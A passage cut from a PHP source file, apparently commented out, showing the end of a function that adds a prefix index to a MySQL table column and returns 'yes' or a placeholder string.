.$tablename ." ADD INDEX " .$indcol ." (" .$indcol ."(5))";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return "yes";}else{mysqli_close($dbcon);return "orutydrfsxgxcvbxcv";}}
*/